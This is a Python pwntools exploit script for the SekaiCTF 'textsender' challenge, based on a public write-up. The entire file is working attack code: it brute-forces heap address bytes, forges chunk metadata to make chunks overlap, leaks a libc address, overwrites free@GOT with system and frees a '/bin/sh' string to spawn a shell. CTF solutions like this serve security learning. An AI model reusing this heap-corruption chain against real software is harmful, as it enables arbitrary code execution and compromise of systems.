#!/usr/bin/env python3

# type: ignore
# flake8: noqa

"""
Based on: https://github.com/itaybel/Weekly-CTF/blob/main/SekaiCTF/pwn/textsender.md
"""

from pwn import *

exe = ELF("./textsender")
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

context.binary = exe

p = process([exe.path])


def set_sender(name):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil(": ")
    p.sendline(name)


def add_msg(receiver="empty", msg="empty"):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("Receiver: ")
    p.sendline(receiver)
    p.recvuntil("Message: ")
    p.sendline(msg)
    return receiver


def edit_msg(name, msg):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Name: ")
    p.sendline(name)
    if p.recvn(1) == b"[":
        return False
    p.recvuntil("message: ")
    old = p.recvline()
    p.recvuntil("message: ")
    p.sendline(msg)
    return True


def print_all():
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("Total: ")
    total = int(p.recvuntil(" ")[:-1])
    prints = []
    for i in range(total):
        p.recvuntil(") ")
        sender = p.recvuntil(":")[:-1]
        msg = p.recvline()[:-1]
        prints.append([sender, msg])
    return prints


def send_all():
    p.recvuntil("> ")
    p.sendline("5")


def main():
    for i in range(7):
        add_msg()

    add_msg()
    send_all()

    chunk_a = add_msg("a", "a")
    third_byte = ""
    for i in range(256):
        if edit_msg("a\x00" + chr(i), "a") and i != 10:
            third_byte = i
            break

    print("third byte is", third_byte)
    fourth_byte = ""
    for i in range(256):
        if edit_msg("a\x00" + chr(third_byte) + chr(i), "a") and i != 10:
            fourth_byte = i
            break
    print("third byte is", fourth_byte)

    heap_base = (fourth_byte << 24) + (third_byte << 16) + (0x50 << 8)

    print("heap base", hex(heap_base))

    send_all()

    prev_size = 0xf0
    current_chunk_address = heap_base + 0x1500

    add_msg("a", b"A" *
            424 +
            p64(prev_size) +
            p64(current_chunk_address +
                0x10) *
            2 +
            p64(current_chunk_address) *
            2)

    for i in range(6):
        add_msg("t", "t")

    chunk_a = add_msg(b"B" * 0x70 + p64(prev_size), "/bin/sh\x00")

    set_sender("AVOID CONSOLIDATION")

    send_all()
    input()

    for i in range(7):
        add_msg()

    binshaddress = heap_base + 0x1600
    free_got = 0x404018

    chunk = add_msg(
        "J",
        b"X" *
        72 +
        p64(0x21) +
        p64(binshaddress) +
        p64(free_got))

    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Name: ")
    p.sendline("/bin/sh\x00")  # this iwll be freed
    p.recvuntil("message: ")
    libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x8cef0
    p.recvuntil("message: ")
    p.sendline(p64(libc.sym.system))

    p.interactive()


if __name__ == "__main__":
    main()
